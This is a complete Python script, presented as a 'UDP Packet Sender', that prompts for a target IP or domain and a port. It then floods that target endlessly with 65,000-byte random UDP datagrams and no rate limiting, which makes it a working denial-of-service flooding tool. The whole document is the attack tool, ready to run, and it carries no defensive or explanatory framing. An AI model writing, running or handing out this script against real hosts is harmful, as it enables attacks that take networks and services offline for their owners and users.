import os
import random
import sys
import socket
import time
import ipaddress

# Clear the terminal screen based on OS
os.system('clear' if os.name == 'posix' else 'cls')

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def send_packets(ip, port):
    data = random._urandom(65000)  # Set packet size to 65,000 bytes

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            s.sendto(data, addr)
            s.close()
            # Print status to indicate packets are being sent
            print(f"\033[1;32mSent packet to {ip} through port {port}\033[0m")
        except Exception as e:
            print(f"\033[1;31mError: {e}\033[0m")
            sys.exit(1)

def main():
    print("UDP Packet Sender")
    print("This script will continuously send UDP packets to the specified IP and port.")
    print("Press Ctrl+C to stop the script.")

    while True:
        try:
            target = input("Enter target IP or domain: ").strip()
            if target and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("Invalid input. Please enter a valid target IP or domain.")
        except KeyboardInterrupt:
            print("\nScript terminated by user. Exiting.")
            sys.exit(0)

    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print(f"Resolved {target} to {ip}")
        except socket.error as e:
            print(f"Error resolving the target: {e}")
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(input("Enter target port: ").strip())
            break
        except ValueError:
            print("Invalid input. Please enter a valid integer for the port.")
        except KeyboardInterrupt:
            print("\nScript terminated by user. Exiting.")
            sys.exit(0)

    print(f"Starting to send packets to {ip} through port {port}.")
    send_packets(ip, port)

if __name__ == "__main__":
    main()
